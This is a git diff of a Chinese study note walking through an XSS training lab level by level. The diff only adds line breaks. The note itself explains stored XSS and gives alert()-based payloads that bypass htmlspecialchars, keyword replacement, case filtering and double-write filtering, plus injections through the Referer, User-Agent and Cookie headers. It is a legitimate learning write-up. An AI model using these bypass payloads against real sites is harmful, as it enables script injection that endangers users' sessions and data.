@@ -8145,9 +8145,9 @@ else{
 }
 ?&gt;
 </code></pre>
-<p>我们看一下这条语句，它把我们通过 GET 传递的参数给存到了数据库里面
+<p>我们看一下这条语句，它把我们通过 GET 传递的参数给存到了数据库里面<br />
 $sql_insert = "insert into yichen(name) values('$name')";</p>
-<p>之后又通过这条语句，把数据库里面的内容取出来，输出在页面上
+<p>之后又通过这条语句，把数据库里面的内容取出来，输出在页面上<br />
 echo "<br>". " - Name: ". $row["name"];</p>
 <p>而在页面上的时候被错误的解析成了 javascript 代码执行了，就弹了一个窗</p>
 <p>来演试一下：在还没有传递 name 这个参数的时候，数据库里面是这样的：</p>
@@ -8183,13 +8183,13 @@ hacker
 <h4 id="_8">第一关</h4>
 <p>没有啥过滤，直接 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <h4 id="_9">第二关</h4>
-<p>有两处，第一处有htmlspecialchars()函数，会把&lt;&gt;标签转义成html编码的格式
+<p>有两处，第一处有htmlspecialchars()函数，会把&lt;&gt;标签转义成html编码的格式<br />
 第二处，没有htmlspecialchars()函数，但是需要逃逸&lt;""&gt;，所以是 <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <h4 id="_10">第三关</h4>
-<p>两处都有htmlspecialchars()函数，没法使用<script></script>这样的啦，因为会被转义，所以使用新的方法
-<code>onclick='alert(/xss/)'</code>
+<p>两处都有htmlspecialchars()函数，没法使用<script></script>这样的啦，因为会被转义，所以使用新的方法<br />
+<code>onclick='alert(/xss/)'</code><br />
 <code>onmouseover='alert(/xss/)'</code></p>
-<p>onclick=''  当点击时触发引号内的语句
+<p>onclick=''  当点击时触发引号内的语句<br />
 onmouseover=''   当鼠标经过时触发引号内的语句</p>
 <h4 id="_11">第四关</h4>
 <p>使用双引号闭合就可以了 <code>"onmouseover='alert(1)'</code></p>
@@ -8198,7 +8198,7 @@ onmouseover=''   当鼠标经过时触发引号内的语句</p>
 $str2=str_replace('&lt;script','&lt;scr_ipt',$str);
 $str3=str_replace('on','o_n',$str2);
 </code></pre>
-<p>对 &lt;srcipt 和 on 进行替换，在中间插上了一个 _
+<p>对 &lt;srcipt 和 on 进行替换，在中间插上了一个 _<br />
 在第二个地方没有html转义，所以可以使用 <code>"&gt; &lt;a href='javascript:alert(1)'&gt;</code></p>
 <h4 id="_13">第六关</h4>
 <pre><code class="language-php">&lt;?php
@@ -8208,7 +8208,7 @@ $str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
 $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
 $str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
 </code></pre>
-<p>过滤了上面这一些，但是没有转换大小写，可以使用大小写绕过：
+<p>过滤了上面这一些，但是没有转换大小写，可以使用大小写绕过：<br />
 <code>"OncLick='alert(1)'</code></p>
 <h4 id="_14">第七关</h4>
 <p>把 on 过滤掉了，双写绕过 <code>"oonnclick='alert(1)'</code></p>
@@ -8222,10 +8222,10 @@ $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
 $str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
 $str7=str_replace('&quot;','&amp;quot',$str6);
 </code></pre>
-<p>对传入的转换成小写，同时匹配一些关键字进行替换
+<p>对传入的转换成小写，同时匹配一些关键字进行替换<br />
 <code>javascrip&amp;#116;:alert(1)</code></p>
 <h4 id="_16">第九关</h4>
-<p>要带着http://才行，直接后面注释一下，带着就可以了
+<p>要带着http://才行，直接后面注释一下，带着就可以了<br />
 <code>javascrip&amp;#116;:alert(1)//http://yichen.com</code></p>
 <h4 id="_17">第十关</h4>
 <pre><code class="language-php">&lt;?php 
@@ -8239,7 +8239,7 @@ $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
 &lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
 </code></pre>
 <p>源码中可以传递的参数是 keyword 跟 t_sort，对 keyword 进行了 htmlspecialchars() 函数操作，即进行了html编码，使用 t_sort 过滤掉了尖括号，想要使用的话需要构造出正常的 js</p>
-<p>传参：<code>t_sort="onclick="alert()"type="text</code>
+<p>传参：<code>t_sort="onclick="alert()"type="text</code><br />
 带进去以后是：<code>&lt;input name="t_sort"  value=""onclick="alert()"type="text" type="hidden"&gt;</code></p>
 <h4 id="_18">第十一关</h4>
 <p>通过 HTTP_REFERER 获取到的值放在了 t_ref 里面</p>
@@ -8252,10 +8252,10 @@ $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
 <p>使用 burp 抓包改 <code>Referer:"onclick="alert(1)"type="text</code></p>
 <p><img alt="image.png" src="../img/551828_gm35qctevdc8o52c/1576385223776-95240426-db9d-40b7-bc8c-7f7b3767b582-782785.png" /></p>
 <h4 id="_19">第十二关</h4>
-<p>改的是User_Agent
+<p>改的是User_Agent<br />
 <code>User-Agent: "onclick="alert(1)"type="text</code></p>
 <h4 id="_20">第十三关</h4>
-<p>改的是 cookie 里面的值
+<p>改的是 cookie 里面的值<br />
 <code>Cookie: user="onclick="alert(1)"type="text</code></p>
 <h4 id="_21">第十四关</h4>
 <p>崩了</p>
